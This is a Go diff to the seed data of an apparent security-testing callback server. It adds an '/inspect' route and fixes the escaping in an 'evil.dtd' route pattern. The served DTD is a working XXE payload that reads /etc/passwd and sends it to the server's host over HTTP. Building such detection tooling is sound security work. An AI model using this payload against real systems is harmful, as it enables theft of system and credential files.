@@ -5,9 +5,12 @@ import (
 	"gorm.io/gorm"
 )
 
+const InspectPattern = "/inspect"
+
 func Seed(dbh *gorm.DB) {
 	seedFns := []func(db *gorm.DB) *gorm.DB{
 		seedBreakfastBot,
+		seedInspect,
 		seedHello,
 		seedWPAD,
 		seedXXEEtcHostname,
@@ -37,6 +40,11 @@ func seedBreakfastBot(dbh *gorm.DB) *gorm.DB {
 	return dbh.Create(h)
 }
 
+func seedInspect(dbh *gorm.DB) *gorm.DB {
+	h := newDefaultPayload(InspectPattern, -500)
+	return dbh.Create(h)
+}
+
 func seedHello(dbh *gorm.DB) *gorm.DB {
 	h := newDefaultSimplePayload("/hello$", 1, "application/json", []byte(`{"data":"hello world"}`))
 	return dbh.Create(h)
@@ -60,7 +68,7 @@ func seedXXERemoteRef(dbh *gorm.DB) *gorm.DB {
 }
 
 func seedEvilDTD(dbh *gorm.DB) *gorm.DB {
-	h := newDefaultSimplePayload(`/evil.dtd$`, 1, "text/xml", []byte(`<!ENTITY % payl SYSTEM "file:///etc/passwd">\n<!ENTITY % int "<!ENTITY % trick SYSTEM 'http://{{ .Host }}:80/{{ .AlertPattern }}/xxe?p=%payl;'>">`))
+	h := newDefaultSimplePayload(`/evil\.dtd$`, 1, "text/xml", []byte(`<!ENTITY % payl SYSTEM "file:///etc/passwd">\n<!ENTITY % int "<!ENTITY % trick SYSTEM 'http://{{ .Host }}:80/{{ .AlertPattern }}/xxe?p=%payl;'>">`))
 	return dbh.Create(h)
 }
 func seedXSSJS(dbh *gorm.DB) *gorm.DB {
@@ -98,7 +106,7 @@ func newDefaultSimplePayload(pattern string, sortOrder int, contentType string, 
 	}
 
 	if len(body) > 0 {
-		n.Data.Body = body
+		n.Data.Body = string(body)
 	}
 
 	return n
